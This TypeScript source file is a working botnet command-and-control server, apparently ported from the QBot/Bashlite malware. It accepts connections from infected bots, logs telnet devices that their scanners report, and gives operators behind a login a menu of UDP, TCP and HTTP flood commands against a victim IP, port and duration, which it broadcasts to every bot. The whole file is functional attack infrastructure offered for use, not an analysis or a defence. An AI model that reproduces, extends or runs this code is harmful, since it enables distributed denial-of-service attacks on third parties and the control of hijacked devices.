import net = require('net');
import fs = require('fs/promises');

// Telnet Logins
type login_info = {
    username: string;
    password: string;
};
let accounts: login_info[] = [];

// Bot info
type clientdata_t = {
    ip: string;
    connected: boolean;
    socket: net.Socket;
};
let clients: clientdata_t[] = [];

// Telnet data
type telnetdata_t = {
  connected: number;
}
let managements: telnetdata_t[] = [];

let OperatorsConnected: number = 0;
let TELFound: number = 0;
let scannerreport: number = 0;

let cncserver;
let botserver;

const telFD = (text: string) => { // Scanner logger
  fs.appendFile('telnet.txt', text, 'utf8');
}

function BotsConnected() : number {
  return clients.length;
}

function TitleWriter(socket) {
  socket.write(`\x1b]0;Slaves Connected: ${BotsConnected()} | Masters Connected: ${OperatorsConnected}\x07`);
}

const broadcast = async (msg) => {
  clients.forEach((client) => {
      client.socket.write(msg);
  });
};

function removeClient(socket) {
  let client = clients.filter(c => c.socket === socket)[0];
  if(client) {
    clients.splice(clients.indexOf(client), 1); // Remove client
  }
}

function create_and_bind(port : number) {
  botserver = net.createServer(function(socket) {
      socket.on('error', (e) => {
          removeClient(socket);
      });
      console.log("getaddrinfo: ", socket.remoteAddress);

      const client_data: clientdata_t = {
          ip: socket.remoteAddress,
          connected: true,
          socket: socket
      };
      clients.push(client_data);

      socket.on('disconnect', () => {
          removeClient(socket);
      })

      socket.on('data', function(data) { // this whole scanner method is stupid but im porting it anyway
        let resolved = true;
        switch(data.toString().trim()) {
          case 'PING':
            socket.write('PONG\n');
            break;
          case 'PROBING':
            scannerreport = 1;
            break;
          case 'REMOVING PROBE':
            scannerreport = 0;
            break;
          default:
            resolved = false;
            break;
        }
        if(resolved) return;

        let report = data.toString().trim().split(' ');
        if(report.length == 2) { // perhaps a limit/validation here would be nice for the str size etc
          telFD(`${report[1]}\n`);
          TELFound++;
        }
      })
  }).listen(port);
}

function BotWorker(port: number) {
  cncserver = net.createServer(async function (socket) { // Connection
    let twint;
    OperatorsConnected++;
    socket.on('error', (e) => {
      if(twint) clearInterval(twint);
      OperatorsConnected--;
      console.error(e);
    }); // Handle errors (eg disconnects)

    let username = await new Promise((res) => {
      socket.write('\x1b[37mUsername: \x1b[30m ' )
      socket.once('data', (data) => res(data.toString().trim()));
    });
    let password = await new Promise((res) => {
      socket.write('\x1b[37mPassword: \x1b[30m ' )
      socket.once('data', (data) => res(data.toString().trim()));
    });

    if(!accounts.some(account => account.username === username && account.password === password)) {
      console.log("bad");
      socket.write('\x1b[36mWRONG ANSWER BITCH!!\r\n');
      socket.destroy();
      return;
    }

    twint = setInterval(() => {
      TitleWriter(socket);
    }, 2000);

    socket.write('\x1b[36m   **     **              **          \r\n');
    socket.write('\x1b[36m  /**    /**             //           \r\n');
    socket.write('\x1b[36m  /**    /**   *******    **   **   **\r\n');
    socket.write('\x1b[36m  /**    /*   //**///**  /**  //** ** \r\n');
    socket.write('\x1b[36m  /**    /**   /**  /**  /**   //***  \r\n');
    socket.write('\x1b[36m  /**    /**   /**  /**  /**    **/** \r\n');
    socket.write('\x1b[36m  //*******    ***  /**  /**   ** //**\r\n');
    socket.write('\x1b[36m  //*******    ***  /**  /**   ** //**\r\n');
    socket.write('\x1b[36m   ///////    ///   //   //   //   // \r\n');
    socket.write('\r\n');
    socket.write(`\x1b[37m        #\x1b[36m----- \x1b[37mBot Count: ${BotsConnected()}\x1b[36m -----\x1b[37m#\r\n`);
    socket.write(`\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome, ${username}\x1b[36m --------\x1b[37m#\r\n`);
    socket.write("\x1b[37mType: ");

    socket.on('data', function(chunk) { // Client logged in
        const cmd = chunk.toString().trim();
        let resolved : boolean = true;

        // one-liners
        switch(cmd) {
          case 'BOTS':
            socket.write(`[+] - Slaves: [\x1b[36m ${BotsConnected()} \x1b[37m] [+] - Masters: [\x1b[36m ${OperatorsConnected} \x1b[37m]\r\n`);
            break;
          case 'STATUS':
            socket.write(`[+] - Devices: [\x1b[36m ${TELFound} \x1b[37m] [+] - Status: [\x1b[36m ${scannerreport} \x1b[37m]\r\n`);
            break;
          case 'HELP':
            socket.write('   \r\n\x1b[37m#--- \x1b[36mCOMMANDS \x1b[37m---#\r\n\r\n');
            socket.write('   \x1b[37m- UDP - \x1b[36m!* UDP Victim Port Time 32 0 10\r\n');
            socket.write('   \x1b[37m- TCP - \x1b[36m!* TCP Victim Port Time 32 all 0 10\r\n');
            socket.write('   \x1b[37m- HTTP - \x1b[36m!* HTTP Url Time\r\n');
            socket.write('   \x1b[37m- CNC - \x1b[36m!* CNC IP PORT TIME\r\n');
            socket.write('   \x1b[37m- Kills Attack - \x1b[36mKILL\r\n');
            socket.write('   \x1b[37m- Bot Count - \x1b[36mBOTS\r\n');
            socket.write('   \x1b[37m- Clear Screen - \x1b[36mCLEAR\r\n');
            socket.write('   \x1b[37m- LOGOUT - \x1b[36mLOGOUT\r\n');
            socket.write('   \x1b[37m- TOS - \x1b[36mTOS\r\n');
            socket.write('   \r\n');
            break;
          case 'ls':
            socket.write('   \r\n\x1b[37m#--- \x1b[36mMETHODS \x1b[37m---#\r\n\r\n');
            socket.write('   \x1b[37m- UDP - \x1b[36m!* UDP Victim Port Time 32 0 10\r\n');
            socket.write('   \x1b[37m- TCP - \x1b[36m!* TCP Victim Port Time 32 all 0 10\r\n');
            socket.write('   \x1b[37m- HTTP - \x1b[36m!* HTTP Url Time\r\n');
            socket.write('   \x1b[37m- CNC - \x1b[36m!* CNC IP PORT TIME\r\n');
            break;
          case 'KILL':
            broadcast("!* KILLATTK\r\n");
            break;
          case 'CLEAR':
            socket.write('\x1b[2J\x1b[1;1H');
            socket.write('\x1b[36m   **     **              **          \r\n');
            socket.write('\x1b[36m  /**    /**             //           \r\n');
            socket.write('\x1b[36m  /**    /**   *******    **   **   **\r\n');
            socket.write('\x1b[36m  /**    /*   //**///**  /**  //** ** \r\n');
            socket.write('\x1b[36m  /**    /**   /**  /**  /**   //***  \r\n');
            socket.write('\x1b[36m  /**    /**   /**  /**  /**    **/** \r\n');
            socket.write('\x1b[36m  //*******    ***  /**  /**   ** //**\r\n');
            socket.write('\x1b[36m  //*******    ***  /**  /**   ** //**\r\n');
            socket.write('\x1b[36m   ///////    ///   //   //   //   // \r\n');
            socket.write('\r\n');
            socket.write(`\x1b[37m        #\x1b[36m----- \x1b[37mBot Count: ${BotsConnected()}\x1b[36m -----\x1b[37m#\r\n`);
            socket.write(`\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome, ${username}\x1b[36m --------\x1b[37m#\r\n`);
            break;
          case 'TOS':
            socket.write('\r\n\x1b[36mTOS: \x1b[37mhttp://pastebin.com/HGHUJLE8\r\n\r\n');
            break;
          case 'LOGOUT':
            socket.write(`Bye, ${username}`);
            setTimeout(() => socket.destroy(), 50); // Slight delay as message wasn't being sent
            return;
          default:
            resolved = false;
        }

        if(resolved) { // Exit if resolved
          socket.write('\x1b[37mType: ');
          return;
        }

        if(cmd.startsWith('!*')) { // ATK Detected
          broadcast(cmd + '\r\n');
        }

        socket.write("\x1b[37mType: ");
    });
  }).listen(port);

  cncserver.on('listening', () => {
    console.log('listening on port ' + port);
  })
}

async function main() {

  let threads: number;
  let port: number; // CNC-Port, admin use

  if(process.argv.length != 5) {
    console.log('Usage: node qbot.js [port] [threads] [cnc-port]');
    process.exit(1);
  }

  port = Number(process.argv[4]);
  threads = Number(process.argv[3]);
  console.log('Bot Port', process.argv[2], 'CNC Port', port);
  create_and_bind(Number(process.argv[2])); // Bot port
  BotWorker(port); // cnc port

  // Load accounts
  const file = await fs.readFile('login.txt', 'utf8');
  accounts = file.split('\n').map(line => {
    const [username, password] = line.split(' ');
    return { username, password };
  });
}
main();
